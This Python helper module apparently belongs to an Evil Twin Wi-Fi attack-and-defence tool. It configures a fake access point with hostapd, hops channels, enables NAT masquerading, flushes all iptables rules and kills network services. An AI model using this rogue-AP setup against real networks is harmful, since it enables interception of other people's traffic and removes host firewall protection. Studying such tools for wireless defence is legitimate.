import time
from scapy.all import *
import os


def get_type():
    """
    Function to let the user decide which mode to execute.
    :return:
    """
    result = int(input("Choose the type of action to run:\n" \
                       "1- Attack and de-authenticate user from AP\n" \
                       "2- Defend from Evil Twin Attack\n" \
                       "3- Exit\n\n"))
    if result not in [1, 2, 3]:
        print("Wrong input, please try again!")
        get_type()
    return result


def scan_channels(iface, channel, typeAP=True):
    """
    Switching channels for sniffing packets for users and APs on different channels in a certain range.
    :param iface: interface name
    :param channel: channel range
    :param typeAP: user scan or AP scan
    :return:
    """
    if typeAP:
        print(f"Currently scanning for AP's in channel: {channel}")
    else:
        print(f"Currently scanning for users in channel: {channel}")

    os.system(f"sudo iwconfig {iface} channel {channel}")


def create_hostapd_file(iface, ssid):
    """
    Helped using this website: https://zsecurity.org/how-to-start-a-fake-access-point-fake-wifi/
    Creating the hostapd configuration file for creating the fake AP
    :param iface: interface name
    :param ssid: network name
    :return:
    """
    interface = f"interface={str(iface)}\n"
    driver = "driver=nl80211\n"  # The supported driver for hostapd.
    ssid = f"ssid={str(ssid)}\n"  # Wifi name
    hw_mode = "hw_mode=g\n"  # Simply instruct it to use 2.4GHz band.
    channel = "channel=1\n"  # The channel number to use for the fake access point.
    mac_addr = "macaddr_acl=0\n"  # Tells hostapd to not use MAC filtering
    ignore = "ignore_broadcast_ssid=0\n"  # To make the fake access point visible and not hidden.
    conf_data = interface + driver + ssid + hw_mode + channel + mac_addr + ignore
    with open("conf_files/hostapd.conf", 'w+') as conf_file:
        conf_file.write(conf_data)
    os.chmod("conf_files/hostapd.conf", 0o777)


def delete_conf_files():
    """
    deleting configuration files if they exist
    :return:
    """
    try:
        os.system("rm conf_files/*.conf")
    except:
        print("No configuration files to delete...")


def enable_nat(eth, iface):
    """
    iptables is a command-line firewall utility that uses policy chains to allow or block traffic.
    Masquerade is an algorithm dependent on the iptables implementation that allows one to route traffic without
    disrupting the original traffic. We use it when creating a virtual wifi adapter and share our wifi connection via
    masquerading it to a virtual adapter. In other words... "Share our wifi connection through wifi"
    :param eth: eth name
    :param iface: interface name
    :return:
    """
    os.system(f"iptables --table nat --append POSTROUTING --out-interface {eth} -j MASQUERADE")
    os.system(f"iptables --append FORWARD --in-interface {iface} -j ACCEPT")


def reset():
    """
    Making the necessary changes to normalize the setting
    :return:
    """
    delete_conf_files()
    os.system("sudo service NetworkManager start")
    os.system("sudo service apache2 stop")
    os.system("sudo systemctl stop hostapd")
    os.system("sudo killall hostapd")
    os.system("sudo systemctl enable systemd-resolved.service")
    os.system("sudo systemctl start systemd-resolved")


def kill_processes():
    """
    Killing the necessary processes to create the fake AP
    :return:
    """
    os.system("sudo systemctl disable systemd-resolved.service")
    os.system("sudo systemctl stop systemd-resolved")
    os.system("sudo pkill -9 hostapd")
    os.system("sudo pkill -9 avahi-daemon")
    os.system("sudo pkill -9 dhclient")
    os.system("sudo killall hostapd")


def ip_tables_config():
    """
    Making the necessary changes using iptables tp delete all the firewall rules
    :return:
    """
    os.system("sudo iptables --flush")
    os.system("sudo iptables --table nat --flush")
    os.system("sudo iptables --delete-chain")
    os.system("sudo iptables --table nat --delete-chain")
    os.system("sudo iptables -P FORWARD ACCEPT")


def iface_name_to_file():
    """
    Using this method to grab the interface name and output it to a txt file.
    :return:
    """
    os.system("iwconfig 2>&1 | grep -oP \"^\w+\" | tail -1 > iface_name.txt")
